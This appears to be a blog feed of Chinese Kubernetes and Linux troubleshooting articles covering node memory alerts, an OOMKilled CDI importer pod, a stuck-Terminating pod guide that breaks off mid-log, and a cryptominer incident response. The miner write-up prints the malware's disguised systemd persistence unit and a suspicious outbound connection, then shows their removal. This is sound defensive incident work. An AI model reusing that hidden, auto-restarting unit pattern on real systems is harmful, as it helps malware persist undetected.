class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># prometheus-rules.yaml</span><br><span class="hljs-built_in">groups</span>:<br>- name: Kubernetes-Resource<br>  rules:<br>  - alert: NodeMemoryPressure<br>    <span class="hljs-built_in">expr</span>: (1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)) * 100 &gt; 85<br>    <span class="hljs-keyword">for</span>: 5m<br>    labels:<br>      severity: critical<br>    annotations:<br>      summary: <span class="hljs-string">&quot;节点内存不足 (&#123;&#123; <span class="hljs-variable">$labels</span>.instance &#125;&#125;)&quot;</span><br>      description: <span class="hljs-string">&quot;节点 &#123;&#123; <span class="hljs-variable">$labels</span>.instance &#125;&#125; 内存使用率超过85%，当前值 &#123;&#123; <span class="hljs-variable">$value</span> &#125;&#125;%&quot;</span><br><br>  - alert: PodEvictionRateHigh<br>    <span class="hljs-built_in">expr</span>: rate(kube_pod_status_evicted[1h]) &gt; 0<br>    <span class="hljs-keyword">for</span>: 10m<br>    labels:<br>      severity: warning<br></code></pre></td></tr></table></figure><h5 id="2-Grafana可视化面板"><a href="#2-Grafana可视化面板" class="headerlink" title="2. Grafana可视化面板"></a><strong>2. Grafana可视化面板</strong></h5><ul><li><p><strong>关键面板配置</strong>：</p></li><li><ul><li><strong>节点资源视图</strong>：<code>node_memory_available_bytes</code>、<code>node_cpu_usage</code></li><li><strong>Pod驱逐统计</strong>：<code>sum(kube_pod_status_evicted) by (namespace)</code></li><li><strong>HPA伸缩历史</strong>：<code>kube_horizontalpodautoscaler_status_current_replicas</code></li></ul></li></ul><h5 id="3-日志聚合分析"><a href="#3-日志聚合分析" class="headerlink" title="3. 日志聚合分析"></a><strong>3. 日志聚合分析</strong></h5><ul><li><strong>Fluentd + Elasticsearch配置</strong>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;match kube.**&gt;<br>  @<span class="hljs-built_in">type</span> elasticsearch<br>  host elasticsearch.production.svc<br>  port 9200<br>  logstash_format <span class="hljs-literal">true</span><br>  logstash_prefix k8s<br>&lt;/match&gt;<br></code></pre></td></tr></table></figure><p>• <strong>关键日志筛选</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Kibana查询被驱逐Pod的日志</span><br>kubernetes.labels.app: <span class="hljs-string">&quot;payment-service&quot;</span> AND message: <span class="hljs-string">&quot;Evicted&quot;</span><br></code></pre></td></tr></table></figure><h1 id="六、预防与容灾演练"><a href="#六、预防与容灾演练" class="headerlink" title="六、预防与容灾演练"></a><strong>六、预防与容灾演练</strong></h1><h5 id="1-混沌工程实践"><a href="#1-混沌工程实践" class="headerlink" title="1. 混沌工程实践"></a><strong>1. 混沌工程实践</strong></h5><ul><li><strong>模拟节点故障</strong>（使用Chaos Mesh）：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: chaos-mesh.org/v1alpha1<br>kind: NodeFailure<br>metadata:<br>  name: node-failure-test<br>spec:<br>  action: shutdown<br>  duration: <span class="hljs-string">&quot;10m&quot;</span><br>  selector:<br>    nodes:<br>    - worker-node-1<br></code></pre></td></tr></table></figure><ul><li><p><strong>验证集群自愈能力</strong>：</p></li><li><p>观察Pod是否自动迁移到健康节点。</p></li><li><p>检查HPA是否按负载自动扩展。</p></li></ul><h5 id="2-定期压力测试"><a href="#2-定期压力测试" class="headerlink" title="2. 定期压力测试"></a><strong>2. 定期压力测试</strong></h5><ul><li><strong>使用Locust模拟流量高峰</strong>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">from locust import HttpUser, task<br><br>class PaymentUser(HttpUser):<br>    @task<br>    def create_order(self):<br>        self.client.post(<span class="hljs-string">&quot;/api/order&quot;</span>, json=&#123;<span class="hljs-string">&quot;items&quot;</span>: [...]&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">locust -f load_test.py --headless -u 1000 -r 100<br></code></pre></td></tr></table></figure><h5 id="3-架构优化"><a href="#3-架构优化" class="headerlink" title="3. 架构优化"></a><strong>3. 架构优化</strong></h5><ul><li><strong>服务网格化</strong>：通过Istio实现熔断和降级。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: networking.istio.io/v1alpha3<br>kind: DestinationRule<br>metadata:<br>  name: payment-service<br>spec:<br>  host: payment-service.production.svc.cluster.local<br>  trafficPolicy:<br>    outlierDetection:<br>      consecutiveErrors: 5<br>      interval: 1m<br>      baseEjectionTime: 3m<br></code></pre></td></tr></table></figure><h1 id="七、总结与经验"><a href="#七、总结与经验" class="headerlink" title="七、总结与经验"></a><strong>七、总结与经验</strong></h1><p><strong>解决效果</strong>：</p><ul><li>紧急措施在30分钟内恢复核心服务，Pod驱逐率降至0。</li><li>通过内存限制和HPA配置，集群资源利用率稳定在70%-80%。</li><li>后续3个月未发生类似事件，故障MTTR（平均修复时间）从4小时缩短至15分钟。</li></ul><p><strong>关键经验</strong>：</p><ol><li><strong>防御性编码</strong>：所有服务必须设置资源<code>limits</code>，并在CI&#x2F;CD流水线中强制检查。</li><li><strong>监控全覆盖</strong>：从节点到Pod层级的资源监控需实现100%覆盖。</li><li><strong>自动化优先</strong>：依赖Cluster Autoscaler、HPA等自动化工具，减少人工干预。</li><li><strong>定期演练</strong>：通过混沌工程暴露系统脆弱点，持续优化架构韧性。</li></ol><p>通过系统化的故障处理与架构优化，Kubernetes集群的稳定性达到99.99% SLA，支撑了后续多次大促活动。</p>]]></content>
    
    
    <categories>
      
      <category>故障指南</category>
      
    </categories>
    
    
    <tags>
      
      <tag>故障指南</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OOM排查思路</title>
    <link href="/2025/04/16/OOM%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/"/>
    <url>/2025/04/16/OOM%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p> K8S + 容器的云原生生态，改变了服务的交付方式，自愈能力和自动扩缩等功能简直不要太好用。</p><p>有好的地方咱要夸，不好的地方咱也要说，真正的业务是部署于容器内部，而容器之外，又有一逻辑层 Pod 。</p><p>对于容器和 K8S 不怎么熟悉的人，一旦程序发生了问题，排查问题就是个头疼的问题。</p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>事情的主角是 kubevirt 的一个开源项目叫 cdi，它的用途是在虚拟机启动之前将虚拟机的镜像导入到系统盘中。</p><p>在使用过程中，我们发现 cdi 在导入数据时会占用大量的内存空间。</p><p>而 cdi-controller 在创建 cdi-importer 的 pod 时，默认限定其最高只能使用 600M 的内存，到最后呢，pod 就发生了 OOMKilled</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@master01</span> ~]<span class="hljs-meta"># kubectl get po</span><br>NAME                               READY   STATUS      RESTARTS   AGE<br>importer-wbm-vda          <span class="hljs-number">0</span>/<span class="hljs-number">1</span>     OOMKilled   <span class="hljs-number">1</span>          <span class="hljs-number">76</span>s<br></code></pre></td></tr></table></figure><h2 id="一、查看-Pod-状态"><a href="#一、查看-Pod-状态" class="headerlink" title="一、查看 Pod 状态"></a><strong>一、查看 Pod 状态</strong></h2><p>首先，检查相关 Pod 的状态，确定是否因为内存超限被杀死。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">[root@master01 ~]<span class="hljs-meta"># kubectl describe pod <span class="hljs-string">&lt;pod-name&gt;</span> -n <span class="hljs-string">&lt;namespace&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>定位关键词</strong></p><p>如果容器因为 OOM 被杀死，通常会显示如下信息</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">State:</span>     Terminated<br><span class="hljs-symbol">Reason:</span>    OOMKilled<br></code></pre></td></tr></table></figure><p><strong>查看 <code>Events</code> 部分：</strong></p><p>如果 Pod 因为内存不足而被 OOM Killer 杀死，你会在事件中看到类似的提示</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">Warning</span>  OOMKilling  kubelet, &lt;node-<span class="hljs-type">name</span>&gt;  Memory cgroup <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> memory: Kill process<br></code></pre></td></tr></table></figure><h2 id="二、查看容器日志"><a href="#二、查看容器日志" class="headerlink" title="二、查看容器日志"></a>二、查看容器日志</h2><p>如果 Pod 被杀死，可以通过查看容器日志，了解容器在发生 OOM 之前的行为。这有助于判断是否存在内存泄漏或内存使用过高的情况</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">[root@master01 ~]<span class="hljs-meta"># kubectl logs <span class="hljs-string">&lt;pod-name&gt;</span> -n <span class="hljs-string">&lt;namespace&gt;</span> --previous</span><br></code></pre></td></tr></table></figure><ul><li>使用 <code>--previous</code> 参数查看被终止容器的日志。</li><li>如果容器在 OOM 之前没有记录错误信息，通常表示容器已经用尽了可用内存，导致进程直接被杀死。</li></ul><h2 id="三、查看-Kubelet-和-Node-日志"><a href="#三、查看-Kubelet-和-Node-日志" class="headerlink" title="三、查看 Kubelet 和 Node 日志"></a>三、查看 Kubelet 和 Node 日志</h2><p><strong>查看 Kubelet 日志</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@master01</span> ~]<span class="hljs-meta"># journalctl -u kubelet -f</span><br></code></pre></td></tr></table></figure><p><strong>或者直接查找与 OOM 相关的日志</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@master01</span> ~]<span class="hljs-meta"># journalctl -u kubelet | grep -i <span class="hljs-string">&#x27;oom&#x27;</span></span><br></code></pre></td></tr></table></figure><p><strong>查看 Node 上的 <code>dmesg</code> 日志，确认是否存在 OOM Killer 杀死进程的记录</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@master01</span> ~]<span class="hljs-meta"># dmesg | grep -i <span class="hljs-string">&#x27;oom&#x27;</span></span><br></code></pre></td></tr></table></figure><h2 id="四、查看资源限制（CPU-和内存）"><a href="#四、查看资源限制（CPU-和内存）" class="headerlink" title="四、查看资源限制（CPU 和内存）"></a>四、查看资源限制（CPU 和内存）</h2><p>确保 Pod 的资源限制配置正确。如果 Pod 的内存限制（<code>memory limit</code>）设置得太低，可能会导致 OOM 错误</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">[root@master01 ~]<span class="hljs-meta"># kubectl get pod <span class="hljs-string">&lt;pod-name&gt;</span> -n <span class="hljs-string">&lt;namespace&gt;</span> -o yaml</span><br></code></pre></td></tr></table></figure><p>检查 <code>resources</code> 配置</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">resources:</span><br><span class="hljs-symbol">  requests:</span><br><span class="hljs-symbol">    memory:</span> <span class="hljs-string">&quot;256Mi&quot;</span><br><span class="hljs-symbol">    cpu:</span> <span class="hljs-string">&quot;250m&quot;</span><br><span class="hljs-symbol">  limits:</span><br><span class="hljs-symbol">    memory:</span> <span class="hljs-string">&quot;512Mi&quot;</span><br><span class="hljs-symbol">    cpu:</span> <span class="hljs-string">&quot;500m&quot;</span><br></code></pre></td></tr></table></figure><h2 id="五、分析容器内存使用"><a href="#五、分析容器内存使用" class="headerlink" title="五、分析容器内存使用"></a>五、分析容器内存使用</h2><p>查看容器的内存使用情况，确认容器是否超过了内存限制。可以使用 <strong><code>kubectl top</code></strong> 来查看资源使用情况</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">[root@master01 ~]<span class="hljs-meta"># kubectl top pod <span class="hljs-string">&lt;pod-name&gt;</span> -n <span class="hljs-string">&lt;namespace&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li>该命令会显示容器当前的内存和 CPU 使用情况。</li><li>比较容器的 <code>memory usage</code> 和 <code>memory limit</code>，如果容器接近其内存限制，就可能发生 OOM 错误。</li></ul><h2 id="六、分析节点内存压力"><a href="#六、分析节点内存压力" class="headerlink" title="六、分析节点内存压力"></a>六、分析节点内存压力</h2><p>OOM 错误可能不仅仅是由于容器本身的内存使用高导致的，也可能是因为节点的整体内存资源不足</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@master01 ~]<span class="hljs-comment"># kubectl describe node &lt;node-name&gt;</span><br></code></pre></td></tr></table></figure><h2 id="七、检查内存泄漏"><a href="#七、检查内存泄漏" class="headerlink" title="七、检查内存泄漏"></a>七、检查内存泄漏</h2><p>如果某个容器频繁 OOM，并且它的内存使用量持续增长，可能是程序中存在内存泄漏</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-title">[</span><span class="hljs-comment">root@master01 ~</span><span class="hljs-title">]</span><span class="hljs-comment"># vmstat 1</span><br><span class="hljs-comment">procs</span> <span class="hljs-literal">-----------</span><span class="hljs-comment">memory</span><span class="hljs-literal">----------</span> <span class="hljs-literal">---</span><span class="hljs-comment">swap</span><span class="hljs-literal">--</span> <span class="hljs-literal">-----</span><span class="hljs-comment">io</span><span class="hljs-literal">----</span> <span class="hljs-literal">-</span><span class="hljs-comment">system</span><span class="hljs-literal">--</span> <span class="hljs-literal">-------</span><span class="hljs-comment">cpu</span><span class="hljs-literal">-------</span><br> <span class="hljs-comment">r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st gu</span><br> <span class="hljs-comment">1  0      0 3099200 590472 1748204    0    0     3    37  527    1  0  0 99  0  0  0</span><br> <span class="hljs-comment">0  0      0 3100144 590472 1748244    0    0     0     0  580  501  0  0 100  0  0  0</span><br> <span class="hljs-comment">0  0      0 3100708 590472 1748244    0    0     0     0  627  478  0  0 100  0  0  0</span><br> <span class="hljs-comment">0  0      0 3096128 590472 1748244    0    0     0     0 1628 1672  1  1 98  0  0  0</span><br></code></pre></td></tr></table></figure><h2 id="八、设置合理的资源限制"><a href="#八、设置合理的资源限制" class="headerlink" title="八、设置合理的资源限制"></a>八、设置合理的资源限制</h2><p>为了避免 OOM 问题的再次发生，确保设置合理的内存请求（<code>requests</code>）和限制（<code>limits</code>）</p><ul><li>**<code>requests</code>**：表示容器启动时需要的最小内存。Kubernetes 会根据 <code>requests</code> 为容器分配内存，确保容器有足够的资源启动。</li><li>**<code>limits</code>**：表示容器可以使用的最大内存。容器使用超过该限制的内存会被 OOM Killer 杀死。</li></ul><h2 id="九、缓存问题"><a href="#九、缓存问题" class="headerlink" title="九、缓存问题"></a>九、缓存问题</h2><p>通过不断的 Google 搜索，我查到了 kubectl top 得到的内存使用数据原来是这么计算的</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">memory</span>.usage_in_bytes-total_inactive_file<br></code></pre></td></tr></table></figure><p>从这个公式可以看出， kubectl top 得到的内存使用数据原来是包含 cache 的。</p><p>正常的 cache 可以提高磁盘数据的读写数据，在读的时候，会拷贝一份文件数据放到内存中，这部分是可回收的，一旦程序内存不足了，会回收部分 cache 的空间，保证程序的正常运行。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/cd1012d805b44daca936117c8b9876aa.png" alt="img"></p><p>可见读文件的缓存，不会影响内存的申请，更别说 OOM，但在写的时候，情况就不一样了</p><p>在写的时候，由于进程处理数据的速度，可能会远大于数据落盘的速度，所以为提高格式转化和数据导入的速度，一般会先将转化好的数据存入缓存中，存入缓存后，进程可以立马 return 回去继续下一堆数据的处理，不用傻傻地等待数据全写入磁盘。</p><p>而存在于缓存之中的数据，则由操作系统同步写入磁盘，这样一来，数据落盘就变成了一个异步的过程，大大提高了写入的速度。</p><p>如果 qemu-img 处理数据的速度远大于 cache 存入磁盘的速度，就会出现内存不足。</p>]]></content>
    
    
    <categories>
      
      <category>故障指南</category>
      
    </categories>
    
    
    <tags>
      
      <tag>故障指南</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于服务器挖矿处理思路</title>
    <link href="/2025/04/16/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%96%E7%9F%BF%E5%A4%84%E7%90%86%E6%80%9D%E8%B7%AF/"/>
    <url>/2025/04/16/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%96%E7%9F%BF%E5%A4%84%E7%90%86%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h3><p>起因是有开发人员报障，程序在发布后无法正常运行，一直处于在重启的状态。</p><p>一开始我以为是程序本身的问题，但在查看服务日志后，并未发现程序有任何错误。</p><p>在查看监控系统时，发现该服务器节点CPU 利用率达到了100%，难怪程序已经无法运行。并且，还发现有这种情况的节点不止一个，整个环境中有好几台服务器都是CPU 100%的情况</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/54b89b99fe603651bad5853bf18f8247.png"></p><h3 id="一、查看进程"><a href="#一、查看进程" class="headerlink" title="一、查看进程"></a>一、查看进程</h3><p>使用Top命令查看进程 ，可以看到CPU的使用率已经跑满。但在进程列表中却未发现有异常进程 。除有个别业务程序占用CPU较多，但关掉后情况并未改善。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e00d13399b5798d88997449ce2f10757.png"></p><h3 id="二、查看网络访问"><a href="#二、查看网络访问" class="headerlink" title="二、查看网络访问"></a>二、查看网络访问</h3><p>此时，怀疑是机器被入侵了，因此通过下面命令查看网络连接的情况。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -an |grep ESTABLISHED<br></code></pre></td></tr></table></figure><p>在查看几台机器后，发现有问题的机器都有一个外网连接，如下所示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcp        0      0 10.12.15.7:39410        86.107.101.103:7643     ESTABLISHED<br><br>虽然每台机器连接的外网IP地址不同，但端口号统一都是 7643，并且查询地址后发现都是国外地址。<br>由于相关的服务器并没有国外的业务，因此可以确定被病毒入侵无疑了。<br></code></pre></td></tr></table></figure><h3 id="三、查看启动项"><a href="#三、查看启动项" class="headerlink" title="三、查看启动项"></a>三、查看启动项</h3><p>使用下面命令查看开机启动项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl list-unit-files |grep enabled<br></code></pre></td></tr></table></figure><p>在启动项中，发现有一个名为OOlmeN2R.service 的可疑服务，怀疑就是病毒。（注：该病毒在不同机器的服务名称皆不同，随机的。但特点是乱码，有大小写或数字。）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">auditd.service                                enabled<br>autovt@.service                               enabled<br>crond.service                                 enabled<br>docker.service                                enabled<br>OOlmeN2R.service                              enabled   &lt;-------<br>rhel-autorelabel.service                      enabled<br>rhel-configure.service                        enabled<br>rhel-dmesg.service                            enabled<br>rhel-domainname.service                       enabled<br>rhel-import-state.service                     enabled<br>rhel-loadmodules.service                      enabled<br>rhel-readonly.service                         enabled<br>rsyslog.service                               enabled<br>sshd.service                                  enabled<br></code></pre></td></tr></table></figure><p>通过下面命令，查看服务的启动状态以及启动文件的存放位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl status OOlmeN2R.service<br></code></pre></td></tr></table></figure><p>接着，找到该启动文件，并查看文件内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> /usr/lib/systemd/system/OOlmeN2R.service<br>[Unit]<br>Description=service<br>After=network.target<br><br>[Service]<br>Type=simple<br>ExecStart=/bin/eWqAVtbn<br>RemainAfterExit=<span class="hljs-built_in">yes</span><br>Restart=always<br>RestartSec=60s<br></code></pre></td></tr></table></figure><p>可以看到，服务在启动时调用了一个&#x2F;bin&#x2F;eWqAVtbn 文件，这应该是就病毒的执行文件了。</p><h3 id="四、清除病毒"><a href="#四、清除病毒" class="headerlink" title="四、清除病毒"></a>四、清除病毒</h3><p>在发现病毒文件后，现在我们可以开始来清除病毒了。</p><p>停止病毒服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl stop OOlmeN2R.service<br>systemctl <span class="hljs-built_in">disable</span> OOlmeN2R.service<br></code></pre></td></tr></table></figure><p>删除相关病毒文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /bin/eWqAVtbn   <span class="hljs-comment">#删除执行文件</span><br><span class="hljs-built_in">rm</span> /usr/lib/systemd/system/OOlmeN2R.service  <span class="hljs-comment"># 删除启动文件</span><br></code></pre></td></tr></table></figure><p>删除完成后，重启服务器。</p><p>完成上述步骤后，再次查看该网络链接，发现该链接已消失。同时，服务器CPU使用率恢复到正常状态 ，病毒被清除了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该病毒有可能是挖矿类的病毒，占用机器资源进行任务，因此导致CPU使用率暴涨。同时，病毒较为狡猾，具有以下特点：</p><p>1.隐藏自己的进程，无法通过TOP命令来发现。<br>2.加入开机启动项，保证重启服务器后依然会生效。<br>3.文件名随机，在不同机器上都不一样，增大了排查难度。</p><p>目前，通过本文档记录的方法，可以有效清除病毒。已知经过处理后的机器未再出现重复中毒情况。</p>]]></content>
    
    
    <categories>
      
      <category>故障指南</category>
      
    </categories>
    
    
    <tags>
      
      <tag>故障指南</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>排查 Pod 状态异常</title>
    <link href="/2025/04/16/%E6%8E%92%E6%9F%A5-Pod-%E7%8A%B6%E6%80%81%E5%BC%82%E5%B8%B8/"/>
    <url>/2025/04/16/%E6%8E%92%E6%9F%A5-Pod-%E7%8A%B6%E6%80%81%E5%BC%82%E5%B8%B8/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#terminating">Terminating</a></li><li><a href="#pending">Pending</a></li><li><a href="#containercreating-waiting">ContainerCreating-Waiting</a></li><li><a href="#crashloopbackoff">CrashLoopBackOff</a></li><li><a href="#imagepullbackoff">ImagePullBackOff</a></li></ul><h1 id="Terminating"><a href="#Terminating" class="headerlink" title="Terminating"></a>Terminating</h1><p>有时候删除 Pod 一直卡在 Terminating 状态，一直删不掉，可以从以下方面进行排查。</p><p><strong>分析思路</strong><br>一、首先我们先了解下pod的删除流程：</p><ul><li>APIServer 收到删除 Pod 的请求，Pod 被标记删除，处于 Terminating 状态。</li><li>节点上的 kubelet watch 到了 Pod 被删除，开始销毁 Pod。</li><li>Kubelet 调用运行时接口，清理相关容器。</li><li>所有容器销毁成功，通知 APIServer。</li><li>APIServer 感知到 Pod 成功销毁，检查 metadata 是否还有 finalizers，如果有就等待其它控制器清理完，如果没有就直接从 etcd 中删除 Pod 记录。</li></ul><p>可以看出来，删除 Pod 流程涉及到的组件包含: APIServer, etcd, kubelet 与容器运行时 (如 docker、containerd)。<br>既然都能看到 Pod 卡在 Terminating 状态，说明 APIServer 能正常响应，也能正常从 etcd 中获取数据，一般不会有什么问题，有问题的地方主要就是节点上的操作。</p><p>二、排查思路<br>检查pod节点是否异常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查找 Terminating 的 Pod 及其所在 Node</span><br>$ kubectl get pod -o wide | grep Terminating<br>grafana-5d7ff8cb89-8gdtz                         1/1     Terminating   1          97d    10.10.7.150   172.20.32.15   &lt;none&gt;           &lt;none&gt;<br><br><span class="hljs-comment"># 检查 Node 是否异常</span><br>$ kubectl get node 172.20.32.15<br>NAME           STATUS      ROLES    AGE    VERSION<br>172.20.32.15   NotReady    &lt;none&gt;   182d   v1.20.6<br><br><span class="hljs-comment"># 查看 Node 相关事件</span><br>$ kubectl describe node 172.20.32.15<br></code></pre></td></tr></table></figure><p><strong>检查内核日志</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dmesg<br><span class="hljs-comment"># journalctl -k</span><br></code></pre></td></tr></table></figure><p><strong>存在i文件属性</strong><br>如果容器的镜像本身或者容器启动后写入的文件存在 “i” 文件属性，此文件就无法被修改删除，而删除 Pod 时会清理容器目录，但里面包含有不可删除的文件，就一直删不了，Pod 状态也将一直保持 Terminating，kubelet 报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Sep 27 14:37:21 VM_0_7_centos kubelet[14109]: E0927 14:37:21.922965   14109 remote_runtime.go:250] RemoveContainer <span class="hljs-string">&quot;19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257&quot;</span> from runtime service failed: rpc error: code = Unknown desc = failed to remove container <span class="hljs-string">&quot;19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257&quot;</span>: Error response from daemon: container 19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257: driver <span class="hljs-string">&quot;overlay2&quot;</span> failed to remove root filesystem: remove /data/docker/overlay2/b1aea29c590aa9abda79f7cf3976422073fb3652757f0391db88534027546868/diff/usr/bin/bash: operation not permitted<br>Sep 27 14:37:21 VM_0_7_centos kubelet[14109]: E0927 14:37:21.923027   14109 kuberuntime_gc.go:126] Failed to remove container <span class="hljs-string">&quot;19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257&quot;</span>: rpc error: code = Unknown desc = failed to remove container <span class="hljs-string">&quot;19d837c77a3c294052a99ff9347c520bc8acb7b8b9a9dc9fab281fc09df38257&quot;</span>: Error response from daemon: container 